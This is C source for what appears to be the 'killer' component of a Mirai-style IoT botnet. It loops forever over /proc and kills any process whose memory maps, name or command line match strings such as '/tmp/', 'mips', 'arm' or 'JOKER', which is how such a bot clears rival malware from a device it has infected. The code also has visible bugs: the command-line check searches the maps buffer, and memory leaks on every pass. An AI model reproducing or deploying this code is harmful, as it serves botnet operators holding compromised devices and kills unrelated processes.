#define _GNU_SOURCE
#include <wait.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>

int killedpids = 0;

const char *mapsstrings[] = {
    "/tmp/",
    "/mnt/",
    "/root/",
    "/var/run"
};

const char *cmdlinestrings[] = {
    "./",
    "/.",
    "JOKER"
};

const char *commstrings[] = {
    "86",
    "arm",
    "mips",
    "mpsl"
};

char *get_cmdline(char *target, char *paths)
{
    char path[20], readbuf[1024] = {0}, *ret;
    sprintf(path, "/proc/%s/%s", target, paths);
    int fd = open(path, O_RDONLY);
    read(fd, readbuf, sizeof(readbuf));
    close(fd);
    asprintf(&ret, "%s", readbuf);
    return ret;
}

void killer()
{
    DIR *proc = opendir("/proc");
    struct dirent *files;
    char *maps, *comm, *cmdline;
    int i;
    while((files = readdir(proc)) != NULL)
    {
        if(atoi(files->d_name) > 1)
        {
            if(atoi(files->d_name) == getpid() || atoi(files->d_name) == getppid())
                continue;
            maps = get_cmdline(files->d_name, "maps"), cmdline = get_cmdline(files->d_name, "cmdline"), comm = get_cmdline(files->d_name, "comm");
            for(i = 0; i < sizeof(mapsstrings)/sizeof(mapsstrings[i]); i++)
            {
                if(strcasestr(maps, mapsstrings[i]))
                {
#ifdef DEBUG
                    printf("[killer-maps] killing pid: %s | string found: %s\n", files->d_name, mapsstrings[i]);
#endif
                    kill(atoi(files->d_name), 9);
                    killedpids++;
                    free(cmdline);
                    goto end;
                }
            }
            for(i = 0; i < sizeof(commstrings)/sizeof(commstrings[i]); i++)
            {
                if(strcasestr(comm, commstrings[i]))
                {
#ifdef DEBUG
                    printf("[killer-comm] killing pid: %s | string found: %s\n", files->d_name, commstrings[i]);
#endif
                    kill(atoi(files->d_name), 9);
                    killedpids++;
                    free(comm);
                    goto end;
                }
            }
            for(i = 0; i < sizeof(cmdlinestrings)/sizeof(cmdlinestrings[i]); i++)
            {
                if(strcasestr(maps, cmdlinestrings[i]))
                {
#ifdef DEBUG
                    printf("[killer-cmdline] killing pid: %s | string found: %s\n", files->d_name, cmdlinestrings[i]);
#endif
                    kill(atoi(files->d_name), 9);
                    killedpids++;
                    free(maps);
                    goto end;
                }
            }
        }
        end:
            continue;
    }
    closedir(proc);
}
int main()
{
    while(1)
    {
        killer();
        usleep(10000);
    }
}